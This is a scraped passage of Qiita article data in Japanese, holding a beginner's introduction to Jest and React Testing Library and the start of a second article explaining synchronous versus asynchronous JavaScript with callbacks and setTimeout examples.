data-content=\"https%3A%2F%2Fqiita.com%2Fossan-engineer%2Fitems%2F4757d7457fafd44d2d2f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nJest React Testing Libraryについて理解を深めるため記事にしました。\n\n# 理解するためのアプローチ\n以下の流れで進めることにしました。\n\n1. JestとReact Testing Library がそもそも何なのかを理解する\n2. JestとReact Testing Libraryの基本的なテストコードの書き方を理解する\n3. 自分で作ったプロジェクトにテストを組み込んで見る\n\n\n# 1. Jest & React Testing Library の基本を知る\nJest と Testing Library が何をするものなのか、大まかに理解する。\n\n## Jestとは\nJavaScript テスティングフレームワーク\n関数やロジックを対象としてテストすると理解\n\n> Jest はあらゆる JavaScript のコードベースの正しさを保証するために設計された JavaScript テスティングフレームワークです。親しみやすく、豊富な機能を持つAPIによって簡単にテストを書くことができ、さらには素早く結果を得ることができます。\n\nhttps://jestjs.io/ja/\n\n## React Testing Libraryとは\nReactコンポーネントのテストを行うためのライブラリ。\n「ユーザーの視点でテストを書く」 ためのツールを提供\n\nユーザーがボタンを押したり、画面に入力した際正しく動くかどうかなどユーザーが行う操作に対してテストすると理解\n\nhttps://testing-library.com/\n\n\n# 2. 基本的なテストの書き方を覚える\n## Jest\n\n公式のチュートリアルでは以下の順番で説明されていました。\n1. Matcher\n2. 非同期コードのテスト\n3. セットアップと破棄\n3. モック関数\n3. Jestプラットフォーム\n\nhttps://jestjs.io/ja/docs/getting-started\n\n### 1.Matcher\n\n```javascript:sum.js\nfunction sum(a, b) {\n  return a + b;\n}\nmodule.exports = sum;\n```\n\n```javascript:sum.test.js\nconst sum = require('./sum');\n\ntest('adds 1 + 2 to equal 3', () => {\n  expect(sum(1, 2)).toBe(3);\n});\n```\n\nexpect()にテストしたい対象を指定（sum関数）\ntoBe()に期待値を指定\n\n値が厳密に等しいかどうかをテストしてくれる。\n\n### 2.非同期コードのテスト\n・ Async/Await\n・ .resolves / .rejects\n\n> async と awaitをテストで使用できます。 非同期テストを書くには、 testに渡す関数の前にasync キーワードを記述するだけです。 例えば、同じfetchData シナリオは次のようにテストできます:\n\nテストコードでもasync/awaitの使用ができると理解\n\n>  expect宣言で.resolves マッチャを使うこともでき、Jestはそのpromiseが解決されるまで待機します。 promiseがrejectされた場合は、テストは自動的に失敗します。\n\n> promiseがrejectされることを期待するケースでは.rejects マッチャを使用してください。 .resolvesマッチャと似た動作をします。 promiseが成功した場合は、テストは自動的に失敗します。\n\n```javascript\ntest('the data is peanut butter', async () => {\n  await expect(fetchData()).resolves.toBe('peanut butter');\n});\n\ntest('the fetch fails with an error', async () => {\n  await expect(fetchData()).rejects.toMatch('error');\n});\n```\n\nテスト対象expect（fetchData()）の処理が完了されることを確認できるのが.resolvesマッチャ\nテスト対象expect（fetchData()）の処理が完了されないことを確認できるのが.rejectsマッチャ\n\n### 3.セットアップと破棄\n#### 繰り返しのセットアップ　beforeEachとafterEach\n\n> 多くのテストで繰り返し行う必要がある場合は、beforeEach と afterEach フックを使用します。\n\n各テストで同じ処理を何度も実行する必要がある場合に使用できると理解\n\n``` javascript\nbeforeEach(() => {\n  initializeCityDatabase();\n});\n\nafterEach(() => {\n  clearCityDatabase();\n});\n\ntest('city database has Vienna', () => {\n  expect(isCity('Vienna')).toBeTruthy();\n});\n\ntest('city database has San Juan', () => {\n  expect(isCity('San Juan')).toBeTruthy();\n});\n```\n\ncity database has Vienna、city database has San Juanそれぞれのテスト実行前にinitializeCityDatabase();を実行\nテスト実行後はclearCityDatabase();が実行される\n\n### 4.モック関数\n\nconst mock = jest.fn();でモックを作れる。\nテスト対象で実際に動かしたくないときに使用。\n\n\n### 5.Jestプラットフォーム\nJestの特定の機能をパッケージ化して便利にしたもの\n\n\n## React Testing Library\n\nhttps://qiita.com/ossan-engineer/items/4757d7457fafd44d2d2f\n\n\n\nhttps://testing-library.com/docs/react-testing-library/example-intro\n\nこちらの記事とドキュメントを参考にしました。\n\n### 1.レンダリング\n\nrender関数でテストしたいコンポーネントをレンダリング\n\n```javascript\nimport App from \"../App\";\nimport React from \"react\";\nimport { render, screen } from \"@testing-library/react\";\n\ndescribe(\"Title Test\", () => {\n  it(\"test1\", () => {\n    render(<App />);\n\t\tscreen.debug();\n  });\n});\n```\nscreen.debug()でコンポーネントの中身をコンソール上で表示できる\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b6b19567-e46a-4730-938e-ecab0a705a87.png)\n\n### 2.要素の取得\n\nレンダリングした要素を取得して、テスト対象を特定します。\n要素の取得方法は下記の記事を参考にしました。\n\nhttps://qiita.com/ossan-engineer/items/4757d7457fafd44d2d2f\n\ngetByとfindByの違いについて、エラーを通して理解しました\n\n   - getBy*: 要素が見つからないと例外を投げる（存在確認用）\n   - queryBy*: 要素が見つからなくてもnullを返す（非存在確認用）\n   - findBy*: 非同期で要素を探し、Promiseを返す（非同期表示確認用）\n\nhttps://qiita.com/asa129/items/daf4c12cc5571a5a4b17\n\n\n# 3.自分で作ったプロジェクトにテストを組み込んで見る\n\n## テストしたいこと\n入力をしないで登録を押すとエラーが表示される\n\n## 実現するために\n`expect`：登録ボタンを押下\n`Matcher`：画面に表示されたエラー内容が期待値通りになること\nで実現できるか考えてみました\n\n\n```javascript\nimport App from \"../App\";\nimport React from \"react\";\nimport '@testing-library/jest-dom'\nimport { render, screen, within, waitFor, cleanup} from \"@testing-library/react\";\nimport userEvent from \"@testing-library/user-event\";\n\nafterEach(() => {\n\tcleanup();\n});\n\ndescribe(\"RegistDelete Test\", () => {\n\tit(\"入力をしないで登録を押すとエラーが表示される\", async () => {\n\n\t\trender(<App />);\n\n\t\t// 登録ボタン押下\n\t\tuserEvent.click(await screen.findByTestId(\"add\"));\n\n\t\texpect(await screen.findByTestId(\"error\")).toHaveTextContent(\"入力されていない項目があります\");\n\t});\n});\n```\n\n\n# おわりに\n基本的なことをまとめてみました。モック関数などまだまだわからないことばかりなので、今後も学習を進めて適切なテストコードをかけるようになりたいです。\n\n# 参考\nhttps://jestjs.io/ja/\n\nhttps://testing-library.com/\n\nhttps://qiita.com/ossan-engineer/items/4757d7457fafd44d2d2f\n","coediting":false,"comments_count":0,"created_at":"2025-03-16T18:26:16+09:00","group":null,"id":"b4962b1a353905e4bb5a","likes_count":5,"private":false,"reactions_count":0,"stocks_count":2,"tags":[{"name":"テスト","versions":[]},{"name":"初心者","versions":[]},{"name":"Jest","versions":[]},{"name":"React","versions":[]}],"title":"Jest & React Testing Libraryに入門してみた","updated_at":"2025-03-16T18:26:16+09:00","url":"https://qiita.com/asa129/items/b4962b1a353905e4bb5a","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":1210,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:135\">javascriptやreact、jest、testing-libraryに触れてきてエラーに遭遇したとき、非同期処理が理解できていないから解決できないのではと思いました。<br>\nなんとなくわかっているつもりになっている非同期処理について、学んだことをまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:41\">\n<span id=\"同期処理と非同期処理の違い\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86%E3%81%A8%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>同期処理と非同期処理の違い</h1>\n<p data-sourcepos=\"6:1-6:102\">「非同期処理」という言葉があるということは、同期処理もあるはずです。</p>\n<h2 data-sourcepos=\"8:1-8:15\">\n<span id=\"同期処理\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86\"><i class=\"fa fa-link\"></i></a>同期処理</h2>\n<p data-sourcepos=\"9:1-9:105\">一つの処理が完了するのを待ってから、次の処理へ進むことと理解しました。</p>\n<p data-sourcepos=\"11:1-11:18\">※MDNから引用</p>\n<div class=\"code-frame\" data-lang=\"JavaScript\" data-sourcepos=\"13:1-18:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"dl\">\"</span><span class=\"s2\">Miriam</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"kd\">const</span> <span class=\"nx\">greeting</span> <span class=\"o\">=</span> <span class=\"s2\">`こんにちは。私は </span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\"> です。`</span><span class=\"p\">;</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">greeting</span><span class=\"p\">);</span>\n<span class=\"c1\">// \"こんにちは。私は Miriam です。\"</span>\n</code></pre></div></div>\n<p data-sourcepos=\"20:1-20:108\">コードは上から順番に処理が終わるのを待ってから、次の処理が実行されます。</p>\n<h3 data-sourcepos=\"22:1-22:34\">\n<span id=\"同期処理のデメリット\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86%E3%81%AE%E3%83%87%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>同期処理のデメリット</h3>\n<p data-sourcepos=\"23:1-24:69\">一つの処理が完了してから次の処理が実行されるため、処理負荷が大きいと時間がかかってしまいます。<br>\n簡易的に処理負荷が大きいものを作ってみました。</p>\n<p data-sourcepos=\"26:1-26:63\"><iframe id=\"qiita-embed-content__c41526296a4cb7375e097e76de6896ac\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__c41526296a4cb7375e097e76de6896ac\" data-content=\"https%3A%2F%2Fstackblitz.com%2Fedit%2Fvitejs-vite-slup2cs9%3Ffile%3DREADME.md\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"28:1-29:210\">メッセージ表示ボタン、テキスト入力欄、表示ボタンを用意しました。<br>\nこの例では、表示ボタンを押したときに重い処理（10万回ループ処理・コンソールに1を表示する）を実行するため、その間に他の操作ができなくなります。</p>\n<p data-sourcepos=\"31:1-31:148\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4fca20eb-ea00-4627-8056-771876838028.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2332fb4df50458d8f28ac4fc47b97779\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4fca20eb-ea00-4627-8056-771876838028.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2332fb4df50458d8f28ac4fc47b97779\" alt=\"同期処理キャプチャ (1).gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F4fca20eb-ea00-4627-8056-771876838028.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=74e3c22eec7f27971329f614db8e5c9e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/4fca20eb-ea00-4627-8056-771876838028.gif\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"33:1-33:129\">時間のかかる処理があると他の操作ができなくなることは、同期処理の大きなデメリットです。</p>\n<div class=\"code-frame\" data-lang=\"react\" data-sourcepos=\"35:1-65:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.jsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useState</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">react</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"dl\">'</span><span class=\"s1\">./App.css</span><span class=\"dl\">'</span><span class=\"p\">;</span>\n\n<span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">[</span><span class=\"nx\">message</span><span class=\"p\">,</span> <span class=\"nx\">setMessage</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nf\">useState</span><span class=\"p\">(</span><span class=\"dl\">''</span><span class=\"p\">);</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">onClickDisplay</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">array</span> <span class=\"o\">=</span> <span class=\"p\">[...</span><span class=\"nc\">Array</span><span class=\"p\">(</span><span class=\"mi\">100</span><span class=\"nx\">_000</span><span class=\"p\">)];</span>\n    <span class=\"nx\">array</span><span class=\"p\">.</span><span class=\"nf\">forEach</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">));</span>\n    <span class=\"nf\">alert</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">値入れたよ</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">onClickDisplayM</span> <span class=\"o\">=</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nx\">message</span> <span class=\"o\">===</span> <span class=\"dl\">''</span> <span class=\"p\">?</span> <span class=\"nf\">setMessage</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">メッセージだよ</span><span class=\"dl\">'</span><span class=\"p\">)</span> <span class=\"p\">:</span> <span class=\"nf\">setMessage</span><span class=\"p\">(</span><span class=\"dl\">''</span><span class=\"p\">);</span>\n  <span class=\"p\">};</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>同期処理<span class=\"p\">&lt;/</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">button</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">onClickDisplay</span><span class=\"p\">()</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>表示<span class=\"p\">&lt;/</span><span class=\"nt\">button</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">button</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">onClickDisplayM</span><span class=\"p\">()</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>メッセージ表示<span class=\"p\">&lt;/</span><span class=\"nt\">button</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">message</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nt\">input</span> <span class=\"na\">type</span><span class=\"p\">=</span><span class=\"s\">\"text\"</span> <span class=\"na\">placeholder</span><span class=\"p\">=</span><span class=\"s\">\"なにか入力できるよ\"</span> <span class=\"p\">/&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">export</span> <span class=\"k\">default</span> <span class=\"nx\">App</span><span class=\"p\">;</span>\n\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"72:1-72:18\">\n<span id=\"非同期処理\" class=\"fragment\"></span><a href=\"#%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86\"><i class=\"fa fa-link\"></i></a>非同期処理</h2>\n<p data-sourcepos=\"73:1-74:120\">同期処理における「処理が終わるまで待つ」問題を解決するために使われる、<br>\n非同期処理の本質は「ある処理の完了を待たずに次の処理に進むこと」と理解しました。</p>\n<h1 data-sourcepos=\"76:1-76:41\">\n<span id=\"javascript-の非同期処理の方法\" class=\"fragment\"></span><a href=\"#javascript-%E3%81%AE%E9%9D%9E%E5%90%8C%E6%9C%9F%E5%87%A6%E7%90%86%E3%81%AE%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>JavaScript の非同期処理の方法</h1>\n<h3 data-sourcepos=\"77:1-77:44\">\n<span id=\"1-コールバック関数とsettimeout\" class=\"fragment\"></span><a href=\"#1-%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%90%E3%83%83%E3%82%AF%E9%96%A2%E6%95%B0%E3%81%A8settimeout\"><i class=\"fa fa-link\"></i></a>1. コールバック関数とsetTimeout</h3>\n<p data-sourcepos=\"78:1-79:132\">最も基本的な非同期処理<br>\n関数を引数に渡すことができ、引数になっている関数のことをコールバック関数と呼ぶそうです。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"80:1-103:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span> \n  <span class=\"c1\">// setTimeoutで1秒遅らせてコールバックを実行</span>\n  <span class=\"nf\">setTimeout</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">callback</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"mi\">1000</span><span class=\"p\">);</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`こんにちは、</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">さん！`</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">処理を開始します</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">A</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">次の処理に進みます</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\n<span class=\"c1\">// 出力:</span>\n<span class=\"c1\">// 処理を開始します</span>\n<span class=\"c1\">// こんにちは、Aさん！</span>\n<span class=\"c1\">// 次の処理に進みます</span>\n<span class=\"c1\">// (1秒後)</span>\n<span class=\"c1\">// 挨拶が終わりました</span>\n</code></pre></div></div>\n<p data-sourcepos=\"105:1-107:120\"><code>setTimeout</code>を使用しない場合、同期的に処理されるため、コールバック関数が先に実行されてしまいます。<br>\n<code>setTimeout</code>で1秒遅らせることで、処理の順序を制御できます。<br>\n⇒「ある処理の完了を待たずに次の処理に進む」が実現できていることを理解しました。</p>\n<h3 data-sourcepos=\"109:1-109:79\">\n<span id=\"コールバック関数でのデメリットコールバック地獄\" class=\"fragment\"></span><a href=\"#%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%90%E3%83%83%E3%82%AF%E9%96%A2%E6%95%B0%E3%81%A7%E3%81%AE%E3%83%87%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88%E3%82%B3%E3%83%BC%E3%83%AB%E3%83%90%E3%83%83%E3%82%AF%E5%9C%B0%E7%8D%84\"><i class=\"fa fa-link\"></i></a>コールバック関数でのデメリット（コールバック地獄）</h3>\n<p data-sourcepos=\"110:1-110:102\">複数の人に対して順番に挨拶したいとき、以下のコードで書いてみました。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"111:1-140:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// setTimeoutで1秒遅らせてcallbackを実行する</span>\n  <span class=\"nf\">setTimeout</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">callback</span><span class=\"p\">(),</span> <span class=\"mi\">1000</span><span class=\"p\">);</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`こんにちは、</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">さん！`</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">A</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">B</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">C</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">D</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n\n<span class=\"c1\">// 出力予想:</span>\n<span class=\"c1\">// こんにちは、Aさん！</span>\n<span class=\"c1\">// 挨拶が終わりました</span>\n<span class=\"c1\">// こんにちは、Bさん！</span>\n<span class=\"c1\">// 挨拶が終わりました</span>\n<span class=\"c1\">// こんにちは、Cさん！</span>\n<span class=\"c1\">// 挨拶が終わりました</span>\n<span class=\"c1\">// こんにちは、Dさん！</span>\n<span class=\"c1\">// 挨拶が終わりました</span>\n</code></pre></div></div>\n<p data-sourcepos=\"141:1-141:42\">結果は以下の通りになります。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"142:1-152:3\"><div class=\"highlight\"><pre><code>こんにちは、Aさん！\nこんにちは、Bさん！\nこんにちは、Cさん！\nこんにちは、Dさん！\n（約1秒後）\n挨拶が終わりました\n挨拶が終わりました\n挨拶が終わりました\n挨拶が終わりました\n</code></pre></div></div>\n<ol data-sourcepos=\"153:1-166:0\">\n<li data-sourcepos=\"153:1-155:0\">\n<p data-sourcepos=\"153:4-154:67\"><code>greet(\"A\", ...)</code> が呼ばれます<br>\nすぐに「こんにちは、Aさん！」と表示されます</p>\n</li>\n<li data-sourcepos=\"156:1-158:0\">\n<p data-sourcepos=\"156:4-157:67\"><code>greet(\"B\", ...)</code> が呼ばれます<br>\nすぐに「こんにちは、Bさん！」と表示されます</p>\n</li>\n<li data-sourcepos=\"159:1-161:0\">\n<p data-sourcepos=\"159:4-160:67\"><code>greet(\"C\", ...)</code> が呼ばれます<br>\nすぐに「こんにちは、Cさん！」と表示されます</p>\n</li>\n<li data-sourcepos=\"162:1-163:67\">\n<p data-sourcepos=\"162:4-163:67\"><code>greet(\"D\", ...)</code> が呼ばれます<br>\nすぐに「こんにちは、Dさん！」と表示されます</p>\n</li>\n<li data-sourcepos=\"164:1-166:0\">\n<p data-sourcepos=\"164:4-164:148\">1秒後に、すべての<code>setTimeout</code>が発火し、「挨拶が終わりました」というメッセージもほぼ同時に表示されます</p>\n</li>\n</ol>\n<p data-sourcepos=\"167:1-167:60\">順番に呼ぶため、以下の形に修正しました。</p>\n<div class=\"code-frame\" data-lang=\"javascript\" data-sourcepos=\"168:1-188:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"nx\">name</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nf\">setTimeout</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"nf\">callback</span><span class=\"p\">();</span>\n  <span class=\"p\">},</span> <span class=\"mi\">1000</span><span class=\"p\">);</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"s2\">`こんにちは、</span><span class=\"p\">${</span><span class=\"nx\">name</span><span class=\"p\">}</span><span class=\"s2\">さん！`</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">A</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n  <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">B</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">C</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n      <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n      <span class=\"nf\">greet</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">D</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">挨拶が終わりました</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n      <span class=\"p\">});</span>\n    <span class=\"p\">});</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<ol data-sourcepos=\"190:1-202:0\">\n<li data-sourcepos=\"190:1-192:72\">まず <code>greet(\"A\", ...)</code> が呼ばれます\n<ul 